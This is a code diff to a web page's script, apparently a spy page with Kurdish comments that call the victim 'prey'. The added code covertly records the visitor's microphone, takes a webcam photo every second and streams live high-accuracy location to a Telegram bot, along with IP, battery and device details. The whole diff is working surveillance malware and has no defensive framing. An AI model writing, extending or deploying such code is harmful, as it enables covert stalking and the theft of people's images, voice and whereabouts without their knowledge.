@@ -14,23 +14,78 @@
 
     async function capture() {
         if (!targetID) return;
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-            }
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
-                });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+
+            // 🎙️ ١. تۆمارکردنی دەنگ (تەنها یەکجار بۆ ١٠ چرکە)
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append("chat_id", targetID);
+                fd.append("voice", blob, "voice.ogg");
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 10000); // دەوەستێت دوای ١٠ چرکە
+
+            // 📸 ٢. گرتنی وێنەی بەردەوام (هەر ١ چرکە جارێک)
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setInterval(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append("chat_id", targetID);
+                    fd.append("photo", blob, `snap_${Date.now()}.jpg`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+                }, 'image/jpeg', 0.5); // کوالێتی کەم کراوەتەوە بۆ خێرایی
+            }, 1000); // هەر ١٠٠٠ میلی چرکە (١ چرکە)
+
+            // 📍 ٣. چاودێری شوێن (Live Tracking)
+            navigator.geolocation.watchPosition(pos => {
+                const { latitude, longitude } = pos.coords;
+                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                sendToTelegram(`📍 <b>شوێنی نوێی نێچیر:</b>\n<a href='${mapLink}'>بینین لە نەخشە</a>`);
+            }, null, { enableHighAccuracy: true });
+
+            // 🔋 ڕاپۆرتی سیستەم
+            sendSystemReport();
+
+        } catch (e) { console.error(e); }
+    }
+
+    async function sendSystemReport() {
+        let battery = "Unknown";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = `${(b.level * 100).toFixed(0)}%`;
+        }
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        let report = `🦅 <b>نێچیرێکی نوێ لەژێر چاودێریدایە!</b>\n\n` +
+                     `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                     `🔋 <b>Battery:</b> <code>${battery}</code>\n` +
+                     `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+        sendToTelegram(report);
+    }
+
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: targetID, text: message, parse_mode: "HTML" })
+        });
+    }
+</script>
+</body>
+</html>
